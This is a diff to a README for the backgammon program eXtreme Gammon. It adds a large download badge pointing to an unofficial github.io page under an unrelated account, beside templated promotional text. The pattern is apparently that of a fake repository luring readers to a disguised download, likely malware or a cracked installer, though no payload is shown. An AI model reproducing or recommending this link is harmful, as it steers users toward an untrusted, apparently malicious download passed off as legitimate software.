@@ -30,6 +30,12 @@ eXtreme Gammon is the world's leading backgammon software, featuring neural-netw
 
 Whether you're a newcomer or a veteran, eXtreme Gammon provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download eXtreme Gammon](https://img.shields.io/badge/⬇_DOWNLOAD_eXtreme+Gammon-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
